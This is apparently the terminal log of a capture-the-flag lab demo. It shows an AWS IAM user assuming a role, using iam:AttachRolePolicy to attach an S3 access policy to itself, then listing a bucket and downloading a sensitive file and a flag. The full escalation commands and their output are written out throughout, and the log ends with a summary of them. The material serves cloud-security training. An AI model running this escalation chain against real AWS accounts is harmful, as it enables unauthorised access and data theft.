@@ -1,0 +1,97 @@
+[0;32m========================================[0m
+[0;32mIAM AttachRolePolicy Privilege Escalation Demo[0m
+[0;32m========================================[0m
+[1;33mRole-Based Self-Escalation to S3 Bucket[0m
+
+[1;33mStep 1: Getting starting user credentials from Terraform[0m
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+[0;32m✓ Retrieved credentials for pl-prod-iam-009-to-bucket-starting-user[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[1;33mStep 2: Verifying identity[0m
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-iam-009-to-bucket-starting-user
+[0;32m✓ Verified identity as pl-prod-iam-009-to-bucket-starting-user[0m
+
+[1;33mStep 3: Assuming starting role[0m
+Role ARN: arn:aws:iam::123456789012:role/pl-prod-iam-009-to-bucket-starting-role
+[2m[Attacker] $ aws sts assume-role --role-arn "arn:aws:iam::123456789012:role/pl-prod-iam-009-to-bucket-starting-role" --role-session-name "arp-demo-session"[0m
+[0;32m✓ Successfully assumed role pl-prod-iam-009-to-bucket-starting-role[0m
+
+[1;33mStep 4: Verifying we don't have S3 bucket access yet[0m
+Attempting to list S3 bucket contents (should fail)...
+[2m[Attacker] $ aws s3 ls s3://pl-prod-iam-009-to-bucket-697683661464-66pzel/[0m
+[0;32m✓ Confirmed: Cannot access bucket yet[0m
+
+[1;33mStep 5: Escalating privileges via iam:AttachRolePolicy[0m
+Attaching S3 bucket access policy to self...
+Policy ARN: arn:aws:iam::123456789012:policy/pl-prod-iam-009-to-bucket-access-policy
+
+[0;36m[Attacker] $ aws iam attach-role-policy --role-name "pl-prod-iam-009-to-bucket-starting-role" --policy-arn "arn:aws:iam::123456789012:policy/pl-prod-iam-009-to-bucket-access-policy"[0m
+[0;32m✓ Successfully attached S3 access policy to self![0m
+
+[1;33mWaiting 15 seconds for policy changes to propagate...[0m
+
+[1;33mStep 6: Verifying S3 bucket access[0m
+Target bucket: pl-prod-iam-009-to-bucket-697683661464-66pzel
+Listing bucket contents...
+
+[0;36m[Attacker] $ aws s3 ls s3://pl-prod-iam-009-to-bucket-697683661464-66pzel/[0m
+2026-04-23 16:30:49         29 flag.txt
+2026-04-17 05:04:33        344 sensitive-data.txt
+[0;32m✓ Successfully listed bucket contents![0m
+
+[1;33mStep 7: Downloading sensitive data[0m
+
+[0;36m[Attacker] $ aws s3 cp s3://pl-prod-iam-009-to-bucket-697683661464-66pzel/sensitive-data.txt /tmp/iam-009-sensitive-data.txt[0m
+Completed 344 Bytes/344 Bytes (838 Bytes/s) with 1 file(s) remaining
+download: s3://pl-prod-iam-009-to-bucket-697683661464-66pzel/sensitive-data.txt to ../../../../../../../../../../../../tmp/iam-009-sensitive-data.txt
+
+[0;32m✓ Successfully downloaded sensitive file[0m
+[1;33mContents of sensitive file:[0m
+🎉 SUCCESS! You've accessed the S3 bucket via iam:AttachRolePolicy privilege escalation.
+
+Attack Path:
+1. User: pl-prod-iam-009-to-bucket-starting-user
+2. Assumed role: pl-prod-iam-009-to-bucket-starting-role
+3. Used iam:AttachRolePolicy to attach S3 policy to self
+4. Accessed this S3 bucket
+
+Flag: PATHFINDER-ATTACHROLEPOLICY-TO-BUCKET-2024
+[1;33mStep 8: Capturing CTF flag[0m
+
+[0;36m[Attacker] $ aws s3 cp s3://pl-prod-iam-009-to-bucket-697683661464-66pzel/flag.txt -[0m
+[0;32mFLAG: flag{iam_009_bucket_accessed}[0m
+
+[0;32m========================================[0m
+[0;32mCTF FLAG CAPTURED![0m
+[0;32m========================================[0m
+Starting Point: User [1;33mpl-prod-iam-009-to-bucket-starting-user[0m
+Step 1: Assumed role [1;33mpl-prod-iam-009-to-bucket-starting-role[0m
+Step 2: Used [1;33miam:AttachRolePolicy[0m to attach S3 access policy to self
+Step 3: Accessed [1;33mpl-prod-iam-009-to-bucket-697683661464-66pzel[0m
+Step 4: Read [1;33mflag.txt[0m from the target bucket
+Result: [0;32mS3 Bucket Access[0m
+
+[1;33mAttack Path:[0m
+  pl-prod-iam-009-to-bucket-starting-user → (AssumeRole) → pl-prod-iam-009-to-bucket-starting-role → (AttachRolePolicy on self) → S3 Bucket → flag.txt (CTF flag)
+
+[1;33mCTF Flag:[0m [0;32mflag{iam_009_bucket_accessed}[0m
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws iam attach-role-policy --role-name "pl-prod-iam-009-to-bucket-starting-role" --policy-arn "arn:aws:iam::123456789012:policy/pl-prod-iam-009-to-bucket-access-policy"[0m
+  [0;36m$ aws s3 ls s3://pl-prod-iam-009-to-bucket-697683661464-66pzel/[0m
+  [0;36m$ aws s3 cp s3://pl-prod-iam-009-to-bucket-697683661464-66pzel/sensitive-data.txt /tmp/iam-009-sensitive-data.txt[0m
+  [0;36m$ aws s3 cp s3://pl-prod-iam-009-to-bucket-697683661464-66pzel/flag.txt -[0m
+
+[0;32mDownloaded file location: /tmp/iam-009-sensitive-data.txt[0m
+
+[0;31mIMPORTANT: Run cleanup_attack.sh to detach the escalated policy[0m
+
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-pathfinding-starting-user-prod
+[0;32m[demo_permissions] Helpful permissions restored[0m
+[0;31m  Failed to restrict user: pl-pathfinding-starting-user-prod[0m
